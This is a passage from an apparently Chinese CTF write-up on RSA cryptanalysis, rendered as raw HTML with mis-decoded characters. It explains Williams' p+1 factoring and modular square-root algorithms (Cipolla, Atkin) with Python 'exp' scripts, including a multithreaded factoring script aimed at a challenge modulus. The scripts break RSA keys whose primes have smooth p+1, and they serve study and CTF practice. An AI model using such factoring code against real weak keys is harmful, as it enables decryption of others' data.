psï¼šè¿™æ­¥æœ‰å¾ˆå¤§çš„æ“ä½œç©ºé—´ï¼ˆåœ¨Moreé‡Œä¼šæ¶‰åŠç›¸å…³ç®€åŒ–è®¡ç®—å’Œè¯æ˜ï¼‰</p><p>Step 3ï¼šè®¡ç®—$gcd(V_{j}-2,N)$ï¼Œå¦‚æœç»“æœç­‰äº1æˆ–Nï¼Œåˆ™m++å¹¶è¿”å›Step2ï¼Œå¦åˆ™è¿›å…¥Step4.</p><p>Step 4ï¼šæ£€æŸ¥p+1æ˜¯å¦æ˜¯m!çš„å› å­ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¯´æ˜æ‰¾åˆ°çš„pæ˜¯p+1å¹³æ»‘çš„.</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-18_20-33-25.png" alt></p><p>å› ä¸ºæˆ‘ä»¬äº‹å…ˆä¸çŸ¥é“pï¼Œæ‰€ä»¥ä¹Ÿå°±æ— ä»è®¡ç®—é›…å„æ¯”ç¬¦å·(D/p)ï¼Œä½†å¹³æ–¹éå‰©ä½™æ¦‚ç‡è¶‹äº1/2ï¼Œè€ƒè™‘é€‰å–å¤šä¸ªAå¤šçº¿ç¨‹å³å¯ï¼ˆnä¸ªAå°±èƒ½ä½¿äº’æ–¥äº‹ä»¶çš„æ¦‚ç‡é™åˆ°å¤§çº¦$\frac{1}{2^{n}}$ï¼‰</p></li><li><p>Pollardâ€™s p-1 Algorithm</p><p>p-1æ˜¯B-smoothæ—¶ï¼Œå¾ˆå¤§æ¦‚ç‡ä¸Š$(p-1)|B!$ï¼ˆä¸è€ƒè™‘p-1æœ‰å¾ˆå¤šé‡å¤çš„è¶‹è¿‘äºBçš„è´¨å› å­ï¼‰</p><p>æ‰€ä»¥è®¡ç®—$a^{m!}-1$ï¼Œä»¥åŠæ ¡éªŒgcdå³å¯ï¼Œ$m_{max}$å¯ä»¥æ˜¯Bä¹Ÿå¯ä»¥é€‚å½“ä¸Šè°ƒ.</p></li></ul><h4 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">factor_state = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow_with_sqrt</span><span class="params">(a, c, b, n, mod)</span>:</span>  <span class="comment"># (a+c*sqrt(b))^n</span></span><br><span class="line">    states = [(a % mod, c % mod)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(math.log(n, <span class="number">2</span>))):</span><br><span class="line">        new_state = ((pow(states[i][<span class="number">0</span>], <span class="number">2</span>, mod) + b * pow(states[i][<span class="number">1</span>], <span class="number">2</span>, mod)) %</span><br><span class="line">                     mod, (<span class="number">2</span> * states[i][<span class="number">0</span>] * states[i][<span class="number">1</span>]) % mod)</span><br><span class="line">        states.append(new_state)</span><br><span class="line">    n_bin = bin(n)[<span class="number">2</span>:][::<span class="number">-1</span>]</span><br><span class="line">    res_x = <span class="number">1</span></span><br><span class="line">    res_y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(n_bin)):</span><br><span class="line">        <span class="keyword">if</span> n_bin[i] == <span class="string">'1'</span>:</span><br><span class="line">            res_x, res_y = (res_x * states[i][<span class="number">0</span>] + res_y * states[i][<span class="number">1</span>] *</span><br><span class="line">                            b) % mod, (res_x * states[i][<span class="number">1</span>] + res_y * states[i][<span class="number">0</span>]) % mod</span><br><span class="line">    <span class="keyword">return</span> res_x, res_y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">william_factor</span><span class="params">(n, index)</span>:</span></span><br><span class="line">    start = time.clock()</span><br><span class="line">    <span class="keyword">global</span> factor_state</span><br><span class="line">    A = getRandomRange(<span class="number">3</span>, n)</span><br><span class="line">    <span class="comment">#m = 2</span></span><br><span class="line">    <span class="comment">#next_pos = 1</span></span><br><span class="line">    m = <span class="number">3000</span></span><br><span class="line">    next_pos = reduce(<span class="keyword">lambda</span> x, y : x * y, [i + <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(m - <span class="number">1</span>)])</span><br><span class="line">    B = A**<span class="number">2</span> - <span class="number">4</span></span><br><span class="line">    <span class="comment">#res_x1, res_y1 = A, -1</span></span><br><span class="line">    <span class="comment">#res_x2, res_y2 = A, 1</span></span><br><span class="line">    res_x1, res_y1 = pow_with_sqrt(A, <span class="number">-1</span>, B, next_pos, n)</span><br><span class="line">    res_x2, res_y2 = pow_with_sqrt(A, <span class="number">1</span>, B, next_pos, n)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> factor_state == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        print((index, m))</span><br><span class="line">        next_pos *= m <span class="comment">#next_pos = m!</span></span><br><span class="line">        C = inverse(pow(<span class="number">2</span>, next_pos, n), n)</span><br><span class="line">        res_x1, res_y1 = pow_with_sqrt(res_x1, res_y1, B, m, n)</span><br><span class="line">        res_x2, res_y2 = pow_with_sqrt(res_x2, res_y2, B, m, n)</span><br><span class="line">        res_x, res_y = (res_x1 + res_x2) % n, (res_y1 + res_y2) % n</span><br><span class="line">        <span class="keyword">assert</span>(iroot(B, <span class="number">2</span>)[<span class="number">1</span>] == <span class="literal">False</span> <span class="keyword">and</span> res_y != n)</span><br><span class="line">        <span class="keyword">if</span> iroot(B, <span class="number">2</span>)[<span class="number">1</span>] == <span class="literal">True</span>:</span><br><span class="line">            res_x = (res_x + res_y * iroot(B, <span class="number">2</span>)[<span class="number">0</span>]) % n</span><br><span class="line">        <span class="comment"># Vi = C((A-sqrt(B))^(m!)+(A+sqrt(B))^(m!))</span></span><br><span class="line">        Vi = (C * res_x) % n</span><br><span class="line">        p = GCD(Vi - <span class="number">2</span>, n)</span><br><span class="line">        <span class="keyword">assert</span>(p != n) <span class="comment">#p=nè¯´æ˜lucasåºåˆ—ä¸‹æ ‡è¿‡å¤§</span></span><br><span class="line">        <span class="keyword">if</span> p != <span class="number">1</span>:</span><br><span class="line">            factor_state = <span class="literal">True</span></span><br><span class="line">            print(<span class="string">'p ='</span>, p)</span><br><span class="line">            end = time.clock()</span><br><span class="line">            print(<span class="string">'cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        m += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    n = <span class="number">7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409</span></span><br><span class="line">    <span class="comment">#n = 112729</span></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        t = threading.Thread(target=william_factor, args=(n, i))</span><br><span class="line">        threads.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="More-1"><a href="#More-1" class="headerlink" title="More"></a>More</h4><p>å…³äºWilliamâ€™s p+1 Algorithmçš„è¯æ˜ï¼š</p><p>Lucas Functionsï¼šè®¾$\alpha,\beta$æ˜¯$x^{2}-Px+Q=0$çš„æ ¹ï¼Œä¸”æœ‰<img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-20_15-57-19.png" style="zoom:60%;"></p><p>åˆ™å®šä¹‰$\Delta=(\alpha-\beta)^{2}=P^{2}-4Q$ï¼ŒçŸ¥$P=\alpha + \beta,Q=\alpha\beta$.</p><p>æœ‰å¦‚ä¸‹å®šç†ï¼š</p><p>pä¸ºå¥‡ç´ æ•°ï¼Œä¸”$p\nmid Q$ï¼Œå‹’è®©å¾·ç¬¦å·$(\frac{\Delta}{p})=\epsilon$ï¼Œåˆ™æœ‰</p><script type="math/tex; mode=display">U_{(p-\epsilon)m}(P,Q)\equiv 0(mod\ p)\\\\V_{(p-\epsilon)m}(P,Q)\equiv 2Q^{\frac{m(1-\epsilon)}{2}}(mod\ p)</script><p>å‡è®¾æˆ‘ä»¬æœ‰p+1|Rï¼ŒQ=1ï¼Œ$(\frac{\Delta}{p})=\epsilon=-1$ï¼Œåˆ™ç”±ä¸Šè¿°å®šç†å¯çŸ¥ï¼š</p><script type="math/tex; mode=display">U_{R}(P,1)\equiv 0(mod\ p)\\\\V_{R}(P,1)-2\equiv 0(mod\ p)</script><p>å› ä¸ºæ˜“æ¨å‡º$V_{n+1}=PV_{n}-QV_{n-1}=PV_{n}-V_{n-1}$ï¼Œåˆ™åªè¦åœ¨è¯¥lucasåºåˆ—ä¸‹æ±‚å‡º$V_{R}$å³å¯.</p><p>æˆ‘ä¸Šé¢çš„expé‡Œå–çš„Ræ˜¯$m!(m\in N^{+})$ï¼Œä½†mè¶³å¤Ÿå¤§æ—¶ï¼ˆå¦‚m=1000æ—¶ï¼Œ$Râ‰ˆ2^{8000}$ï¼‰ï¼Œé€é¡¹é€’æ¨å˜å¾—ä½æ•ˆä¸å¯è§£.</p><p>å› æ­¤ç®€åŒ–æ€æƒ³å¦‚ä¸‹ï¼š</p><p>ä¸Šè¿°Lucasåºåˆ—å¯¹åº”é€šé¡¹ä¸º$\frac{(P-\sqrt{P^{2}-4})^{n}+(P+\sqrt{P^{2}-4})^{n}}{2^{n}}$ï¼Œå…ˆfuzzå‡ºä¸€ä¸ªmï¼ˆmè¿‡å¤§æ—¶ï¼Œ$gcd(V_R-2,N)=N$ï¼‰ï¼Œå†ä»$V_{m!}$å¼€å§‹p+1 factorå³å¯ï¼Œè¿™é‡Œè¿˜åº”è®°ä½ä¿ç•™å‰çŠ¶æ€$(P-\sqrt{P^{2}-4})^{(m-1)!}$ï¼Œä»¥ä¾¿åœ¨æ±‚è§£$(P-\sqrt{P^{2}-4})^{m!}$æ—¶åªè¦åšå‰çŠ¶æ€çš„mæ¬¡å¹‚ã€‚</p><p>è¿™é‡Œä¹Ÿè®°å½•ä¸€ä¸‹Coinc1denså¸ˆå‚…çš„å‡ºé¢˜ç¬”è®°ï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-20_17-28-56.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-20_17-28-41.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">prime = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>,<span class="number">101</span>,<span class="number">103</span>,<span class="number">107</span>,<span class="number">109</span>,<span class="number">113</span>,<span class="number">127</span>,<span class="number">131</span>,<span class="number">137</span>,<span class="number">139</span>,<span class="number">149</span>,<span class="number">151</span>,<span class="number">157</span>,<span class="number">163</span>,<span class="number">167</span>,<span class="number">173</span>,<span class="number">179</span>,<span class="number">181</span>,<span class="number">191</span>,<span class="number">193</span>,<span class="number">197</span>,<span class="number">199</span>,<span class="number">211</span>,<span class="number">223</span>,<span class="number">227</span>,<span class="number">229</span>,<span class="number">233</span>,<span class="number">239</span>,<span class="number">241</span>,<span class="number">251</span>,<span class="number">257</span>,<span class="number">263</span>,<span class="number">269</span>,<span class="number">271</span>,<span class="number">277</span>,<span class="number">281</span>,<span class="number">283</span>,<span class="number">293</span>,<span class="number">307</span>,<span class="number">311</span>,<span class="number">313</span>,<span class="number">317</span>,<span class="number">331</span>,<span class="number">337</span>,<span class="number">347</span>,<span class="number">349</span>,<span class="number">353</span>,<span class="number">359</span>,<span class="number">367</span>,<span class="number">373</span>,<span class="number">379</span>,<span class="number">383</span>,<span class="number">389</span>,<span class="number">397</span>,<span class="number">401</span>,<span class="number">409</span>,<span class="number">419</span>,<span class="number">421</span>,<span class="number">431</span>,<span class="number">433</span>,<span class="number">439</span>,<span class="number">443</span>,<span class="number">449</span>,<span class="number">457</span>,<span class="number">461</span>,<span class="number">463</span>,<span class="number">467</span>,<span class="number">479</span>,<span class="number">487</span>,<span class="number">491</span>,<span class="number">499</span>,<span class="number">503</span>,<span class="number">509</span>,<span class="number">521</span>,<span class="number">523</span>,<span class="number">541</span>,<span class="number">547</span>,<span class="number">557</span>,<span class="number">563</span>,<span class="number">569</span>,<span class="number">571</span>,<span class="number">577</span>,<span class="number">587</span>,<span class="number">593</span>,<span class="number">599</span>,<span class="number">601</span>,<span class="number">607</span>,<span class="number">613</span>,<span class="number">617</span>,<span class="number">619</span>,<span class="number">631</span>,<span class="number">641</span>,<span class="number">643</span>,<span class="number">647</span>,<span class="number">653</span>,<span class="number">659</span>,<span class="number">661</span>,<span class="number">673</span>,<span class="number">677</span>,<span class="number">683</span>,<span class="number">691</span>,<span class="number">701</span>,<span class="number">709</span>,<span class="number">719</span>,<span class="number">727</span>,<span class="number">733</span>,<span class="number">739</span>,<span class="number">743</span>,<span class="number">751</span>,<span class="number">757</span>,<span class="number">761</span>,<span class="number">769</span>,<span class="number">773</span>,<span class="number">787</span>,<span class="number">797</span>,<span class="number">809</span>,<span class="number">811</span>,<span class="number">821</span>,<span class="number">823</span>,<span class="number">827</span>,<span class="number">829</span>,<span class="number">839</span>,<span class="number">853</span>,<span class="number">857</span>,<span class="number">859</span>,<span class="number">863</span>,<span class="number">877</span>,<span class="number">881</span>,<span class="number">883</span>,<span class="number">887</span>,<span class="number">907</span>,<span class="number">911</span>,<span class="number">919</span>,<span class="number">929</span>,<span class="number">937</span>,<span class="number">941</span>,<span class="number">947</span>,<span class="number">953</span>,<span class="number">967</span>,<span class="number">971</span>,<span class="number">977</span>,<span class="number">983</span>,<span class="number">991</span>,<span class="number">997</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Lucas_pow</span><span class="params">(P, R)</span>:</span></span><br><span class="line">    A, B = P, <span class="number">2</span></span><br><span class="line">    R = bin(R)[<span class="number">3</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> R:</span><br><span class="line">        <span class="keyword">if</span> int(i) == <span class="number">1</span>:</span><br><span class="line">            A, B = (P * A**<span class="number">2</span> - A * B - P) % n, (A**<span class="number">2</span> - <span class="number">2</span>) % n</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            A, B = (A**<span class="number">2</span> - <span class="number">2</span>) % n, (A * B - P) % n</span><br><span class="line">    <span class="keyword">return</span> gcd(A - <span class="number">2</span>, n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Williams_p_1</span><span class="params">()</span>:</span></span><br><span class="line">    R = <span class="number">1</span></span><br><span class="line">    B = iroot(n, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    B = log(B)</span><br><span class="line">    <span class="keyword">for</span> pi <span class="keyword">in</span> prime:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(B//log(pi)):</span><br><span class="line">            R *= pi</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        P = random.randint(<span class="number">2</span>, B)</span><br><span class="line">        p = Lucas_pow(P, R)</span><br><span class="line">        <span class="keyword">if</span> p &gt; <span class="number">1</span> <span class="keyword">and</span> p &lt; n:</span><br><span class="line">            <span class="keyword">return</span> p</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸Šè¿°ç®—æ³•çš„Ré€‰å–å’Œå…ˆå‰é€‰çš„m!ä¸åŒï¼Œä¸”é‡‡ç”¨$V_{f}\rightarrow V_{2f}$çš„è·¨åº¦è¿›è¡Œé€’æ¨.</p><p>å®éªŒå‘ç°åœ¨p+1çš„å°ç´ æ•°å› å­ä¸Šé™Bå·²çŸ¥æ—¶ï¼Œé‡‡å–ä¸Šè¿°æ–¹æ³•ä¼šæ˜æ˜¾å¿«ä¸€äº›ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥æ±‚å‡ºè¯¥æ–¹æ³•ä¸­çš„Rï¼Œå†é€šé¡¹ç›´æ¥æ±‚Rï¼Œå¤§çº¦5så°±èƒ½å‡ºï¼‰.</p><h4 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h4><p><a href="https://math.boisestate.edu/~liljanab/BOISECRYPTFall09/Sundling.pdf" target="_blank" rel="noopener">https://math.boisestate.edu/~liljanab/BOISECRYPTFall09/Sundling.pdf</a></p><p><a href="https://www.ams.org/journals/mcom/1982-39-159/S0025-5718-1982-0658227-7/S0025-5718-1982-0658227-7.pdf" target="_blank" rel="noopener">https://www.ams.org/journals/mcom/1982-39-159/S0025-5718-1982-0658227-7/S0025-5718-1982-0658227-7.pdf</a></p><h3 id="RSA-Square-Root-in-F-p"><a href="#RSA-Square-Root-in-F-p" class="headerlink" title="RSA - Square Root in $F_{p}$"></a>RSA - Square Root in $F_{p}$</h3><h4 id="Theorem-15"><a href="#Theorem-15" class="headerlink" title="Theorem"></a>Theorem</h4><p>Given $b^{2}\equiv a(mod\ p)$</p><ul><li><p>Case 1ï¼š$p\equiv 3(mod\ 4)\rightarrow b:=\pm a^{\frac{p+1}{4}}(mod\ p)$</p></li><li><p>Case 2ï¼šCipollaâ€™s algorithmï¼ˆä¸€èˆ¬æ€§ï¼‰</p><ul><li><p>Step 1ï¼šåœ¨$F_{p}$ä¸Šæ‰¾åˆ°ä¸€ä¸ªtï¼Œä½¿å¾—$u:=t^{2}-a$æ˜¯ä¸€ä¸ªæ¨¡pçš„å¹³æ–¹éå‰©ä½™ï¼ˆå› ä¸ºå¹³æ–¹éå‰©ä½™çš„æ¦‚ç‡è¶‹äº1/2ï¼Œæ‰€ä»¥éšæœºé€‰å–å¹¶ç”¨æ¬§æ‹‰åˆ¤åˆ«å³å¯ï¼‰</p></li><li><p>Step 2ï¼šå®šä¹‰$F_{p^{2}}=F_{p}(\sqrt{t^{2}-a})=\\{x+y\sqrt{t^{2}-a}:x,y\in F_{p}\\}$ï¼Œå…³äº$F_{p^{2}}$æ˜¯åŸŸçš„è¯æ˜æ­¤å¤„ç•¥. ï¼ˆå½“ç„¶ï¼Œ$\omega:=\sqrt{t^{2}-a}$åœ¨$F_{p}$ä¸Šä¸å­˜åœ¨ï¼Œå› æ­¤ç±»ä¼¼è™šæ•°å­˜åœ¨ï¼‰.å…ˆæ¥è¯æ˜ä¸¤ä¸ªå¼•ç†ï¼š(1) $(x+y\omega)^{p}=\sum_{i=0}^{p}C_{p}^{i}x^{p-i}(y\omega)^{i}$ï¼Œå› ä¸ºuæ˜¯å¹³æ–¹éå‰©ä½™ï¼Œæ‰€ä»¥$\omega^{p-1}=(\omega^{2})^{\frac{p-1}{2}}=u^{\frac{p-1}{2}}=-1$. ä¸”på‡æ•´é™¤äºŒé¡¹å¼å±•å¼€ä¸­é—´ç³»æ•°ï¼Œä¸Šå¼å¯è½¬åŒ–ä¸º$x^{p}+y^{p}\omega^{p}(è´¹é©¬å°å®šç†)=x+y\omega^{p}=x-y\omega$.ï¼›(2) $((t+\omega)^{\frac{p+1}{2}})^{2}=(t+\omega)^{p+1}=(t+\omega)(t-\omega)=t^{2}-\omega^{2}=a$.</p><p>æ‰€ä»¥è®¡ç®—$(t+\omega)^{\frac{p+1}{2}}$å³ä¸ºäºŒæ¬¡æ ¹b.</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-17_17-12-37.png" alt></p></li></ul></li><li><p>Case 3ï¼šAtkinâ€™s algorithmï¼ˆ$p\equiv 5(mod\ 8)$ï¼‰</p><p>$c\leftarrow (2a)^{\frac{p-5}{8}}$</p><p>$i\leftarrow 2ac^{2}$</p><p>$b\leftarrow ac(i-1)$</p></li></ul><h4 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">euler_judge</span><span class="params">(x, p)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> pow(x, (p - <span class="number">1</span>) // <span class="number">2</span>, p) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow_in_Fp2</span><span class="params">(a, b, n, p)</span>:</span>  <span class="comment"># (a+sqrt(b))^n in Fp^2</span></span><br><span class="line">    states = [(a % p, <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(math.log(n, <span class="number">2</span>))):</span><br><span class="line">        new_state = ((pow(states[i][<span class="number">0</span>], <span class="number">2</span>, p) + b * pow(states[i][<span class="number">1</span>], <span class="number">2</span>, p)) %</span><br><span class="line">                     p, (<span class="number">2</span> * states[i][<span class="number">0</span>] * states[i][<span class="number">1</span>]) % p)</span><br><span class="line">        states.append(new_state)</span><br><span class="line">    n_bin = bin(n)[<span class="number">2</span>:][::<span class="number">-1</span>]</span><br><span class="line">    res_x = <span class="number">1</span></span><br><span class="line">    res_y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(n_bin)):</span><br><span class="line">        <span class="keyword">if</span> n_bin[i] == <span class="string">'1'</span>:</span><br><span class="line">            res_x, res_y = (res_x * states[i][<span class="number">0</span>] + res_y * states[i][<span class="number">1</span>]</span><br><span class="line">                            * b) % p, (res_x * states[i][<span class="number">1</span>] + res_y * states[i][<span class="number">0</span>]) % p</span><br><span class="line">    <span class="keyword">return</span> res_x, res_y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">square_root</span><span class="params">(a, p)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(euler_judge(a, p) == <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">        b = pow(a, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">    <span class="keyword">elif</span> p % <span class="number">8</span> == <span class="number">5</span>:</span><br><span class="line">        c = pow(<span class="number">2</span> * a, (p - <span class="number">5</span>) // <span class="number">8</span>, p)</span><br><span class="line">        i = (<span class="number">2</span> * a * c**<span class="number">2</span>) % p</span><br><span class="line">        b = (a * c * (i - <span class="number">1</span>)) % p</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = getRandomRange(<span class="number">1</span>, p)</span><br><span class="line">        u = t**<span class="number">2</span> - a</span><br><span class="line">        <span class="keyword">while</span> euler_judge(u, p):</span><br><span class="line">            t = getRandomRange(<span class="number">1</span>, p)</span><br><span class="line">            u = t**<span class="number">2</span> - a</span><br><span class="line">        b, check = pow_in_Fp2(t, u, (p + <span class="number">1</span>) // <span class="number">2</span>, p)</span><br><span class="line">        <span class="keyword">assert</span>(check == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> b, -b % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    root = square_root(<span class="number">19</span>, <span class="number">65537</span>)</span><br><span class="line">    print(root)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="More-2"><a href="#More-2" class="headerlink" title="More"></a>More</h4><p>æœ‰é™åŸŸä¸‹çš„n-th rootå…¶å®åœ¨sympyä¸­ä¹Ÿæœ‰å‡½æ•°å¤„ç†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"></span><br><span class="line">x = nthroot_mod(a, <span class="number">2</span>, p, all_roots=<span class="literal">False</span>) <span class="comment">#æ±‚äºŒæ¬¡æ ¹</span></span><br></pre></td></tr></table></figure><p>ä½†på’Œnè¿‡å¤§æ—¶ï¼Œnthroot_modåœ¨æœ‰é™åŸŸä¸Šæ±‚è§£ä¹Ÿä¼šå˜å¾—æå…¶å›°éš¾ï¼Œå› æ­¤ä¸‹é¢å†åšä¸€ä¸ªè¯¥ç±»å‹çš„æ‹“å±•.</p><h3 